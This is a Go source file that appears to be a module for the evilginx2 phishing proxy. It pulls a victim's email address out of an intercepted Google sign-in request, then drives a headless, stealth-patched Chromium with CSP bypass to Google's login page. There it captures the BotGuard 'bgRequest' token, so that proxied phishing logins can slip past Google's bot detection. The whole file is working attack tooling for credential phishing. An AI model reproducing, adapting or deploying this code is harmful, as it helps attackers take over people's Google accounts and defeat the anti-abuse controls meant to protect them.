/*
*

	Copyright (C) 2021 TomAbel

*
*/
package core

import (
	"bytes"
	"regexp"
	"strings"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"github.com/go-rod/stealth"
	"github.com/kgretzky/evilginx2/log"
)

var bgRegexp = regexp.MustCompile("bgRequest=[^&]*")

func GetToken(body []byte) []byte {

	path, _ := launcher.LookPath()

	l := launcher.New().
		Bin(path).
		Headless(true).
		NoSandbox(true).
		Delete("--disable-extensions").
		Delete("--disable-default-apps").
		Delete("--disable-component-extensions-with-background-pages")

	url := l.MustLaunch()

	browser := rod.New().
		ControlURL(url).
		MustConnect()

	browser = browser.SlowMotion(300)

	defer browser.MustClose()

	page := stealth.MustPage(browser)

	defer page.MustClose()

	{
		_ = proto.PageSetBypassCSP{
			Enabled: true,
		}.Call(page)
	}

	page.MustNavigate("https://accounts.google.com/ServiceLogin")
	stop := make(chan struct{})

	var token []byte
	go page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
		if strings.Contains(e.Request.URL, "accountlookup?") {
			token = []byte(bgRegexp.FindString(e.Request.PostData))

			close(stop)
		}
	})()

	page.MustNavigate("https://accounts.google.com/signin/v2/identifier")
	page.MustElement("#identifierId").MustInput(GetEmail(body)).MustKeyActions().Press(input.Enter)
	<-stop

	return token
}

func GetEmail(body []byte) string {
	exp := regexp.MustCompile(`f\.req=%5B%22(.*?)%22`)
	email_match := exp.FindSubmatch(body)
	matches := len(email_match)
	if matches != 2 {
		log.Error("[Botguard]: Found %v matches for email, expecting 2", matches)
		return ""
	}
	return string(bytes.ReplaceAll(email_match[1], []byte("%40"), []byte("@")))
}
